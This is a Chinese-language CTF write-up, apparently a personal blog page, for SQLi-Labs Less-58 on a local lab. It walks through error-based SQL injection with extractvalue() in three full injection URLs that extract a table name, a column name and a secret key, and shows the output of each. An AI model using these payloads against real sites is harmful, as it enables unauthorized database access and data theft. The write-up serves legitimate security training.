@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-58 Challenge-5 报错注入 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-58 Challenge-5 报错注入 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.28 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, 报错注入, Challenge</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入 Challenge 系列</li>
+        <li><strong>题目名称：</strong>Less-58 (Challenge-5)</li>
+        <li><strong>提示：</strong>目标是从 <code>challenges</code> 库提取密钥，限制 5 次尝试，随机表名/列名。</li>
+    </ul>
+
+    <h2>2. 核心原理与前置分析</h2>
+    <p>本关卡虽然机制依然是随机表名与限制尝试，但数据回显逻辑发生了变化。后端 PHP 使用数组映射（如 <code>$row['id']</code>）来输出页面，导致常规的 <code>UNION SELECT</code> 联合查询无法将数据直接打印在页面上。</p>
+    <p><strong>破局思路：</strong>由于页面依然保留了 <code>mysql_error()</code> 的回显，必须切换为 **报错注入（Error-Based Injection）**。利用 <code>extractvalue()</code> 函数，将查询结果拼接为非法 XPath，强制数据库在报错信息中吐出数据。注意 <code>extractvalue</code> 最多只能回显 32 个字符。</p>
+
+    <h2>3. 操作步骤与解析</h2>
+    
+    <p><strong>第一步：获取随机表名（消耗 1 次尝试）</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=1' and extractvalue(1,concat(0x7e,(select concat(table_name,0x3a,column_name) from information_schema.columns where table_schema='challenges' limit 1)))--+</code></p>
+    <p><strong>回显现象：</strong><code>XPATH syntax error: '~wotilcrq2c:id'</code>。</p>
+    <p><strong>解释与原理：</strong>使用单引号闭合。通过子查询提取当前库的第一个表名和列名，拼接波浪号触发报错，获取到当前随机表名为 <code>wotilcrq2c</code>。</p>
+
+    <p><strong>第二步：精准获取密钥列名（消耗 1 次尝试）</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=1' and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='challenges' and table_name='wotilcrq2c' and column_name like 'secret%' limit 1)))--+</code></p>
+    <p><strong>回显现象：</strong><code>XPATH syntax error: '~secret_SQQL'</code>。</p>
+    <p><strong>解释与原理：</strong>由于 32 字符限制，直接一次性查出所有列名容易截断。利用 <code>LIKE 'secret%'</code> 条件精准过滤出密钥列名。</p>
+
+    <p><strong>第三步：提取 24 位密钥（消耗 1 次尝试）</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=1' and extractvalue(1,concat(0x7e,(select secret_SQQL from challenges.wotilcrq2c)))--+</code></p>
+    <p><strong>回显现象：</strong><code>XPATH syntax error: '~DZqqdz2QMVZv24a2VXloADHAd'</code>。</p>
+    <p><strong>解释与原理：</strong>代入真实的表名和列名，直接报错提取目标数据。</p>
+
+    <p><strong>第四步：提交通关</strong></p>
+    <p>将密钥粘贴至页面底部提交框，成功通关。</p>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>联合查询失效：</strong>遇到页面不回显查询结果、但保留报错信息的场景，需立刻切换为报错注入（<code>extractvalue</code> 或 <code>updatexml</code>）。</li>
+        <li><strong>字符截断限制：</strong><code>extractvalue</code> 存在 32 字符物理截断。在查询表名和列名时，使用 <code>limit 1</code> 及精准条件过滤，避免拼接过长导致数据不完整。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>报错注入（Error-Based Injection）</strong>：利用函数机制缺陷，通过错误信息外带数据。</li>
+        <li><strong>条件过滤（Targeted Filtering）</strong>：在严苛环境限制下，利用 SQL 逻辑条件（如 <code>LIKE</code>）精准抓取目标。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
